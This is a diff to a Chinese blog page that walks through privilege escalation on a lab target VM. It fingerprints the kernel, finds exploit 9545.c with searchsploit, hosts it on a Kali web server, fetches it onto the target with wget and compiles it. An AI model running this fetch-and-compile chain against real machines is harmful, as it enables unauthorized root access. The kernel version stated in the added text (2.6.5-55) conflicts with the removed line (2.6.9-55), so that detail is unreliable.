@@ -259,10 +259,33 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
 
 <p><img src="image-20211119222955203.png" alt="image-20211119222955203"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*elease</span><br></pre></td></tr></table></figure>
+<p>发现系统内核版本<em>2.6.5-55，为RHEL 4 Update 5系列</em></p>
+<p>查看Centos的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
 
-<p>发现版本是 2.6.9-55.EL，</p>
-<p>使用searchsploit对该漏洞进行查询</p>
+<p><img src="image-20211122114630694.png" alt="image-20211122114630694"></p>
+<p>可以利用以上两个重要信息使用searchsploit对该漏洞进行查询</p>
+<p>现根据内核版本查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit RHEL 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211122141022254.png" alt="image-20211122141022254"></p>
+<p>将找到的漏洞脚本拷贝到桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/9545.c /root/桌面/</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211122141740293.png" alt="image-20211122141740293"></p>
+<p>开启kali的http服务，并将poc文件移动到html目录下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /root/桌面/9545.c /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211122142301890.png" alt="image-20211122142301890"></p>
+<p>在靶机上使用wget下载该文件：</p>
+<p>下载到tmp目录下，因为该目录的权限限制最少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.135.128/9545.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211122142600862.png" alt="image-20211122142600862"></p>
+<p>在靶机上使用gcc编译poc并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 9545.c -o 123</span><br><span class="line">-o表示修改文件名为..</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211122142838962.png" alt="image-20211122142838962"></p>
 <p><img src="image-20211119235838484.png" alt="image-20211119235838484"></p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2d997a306252">大佬博客全面详细还易懂</a></p>
 
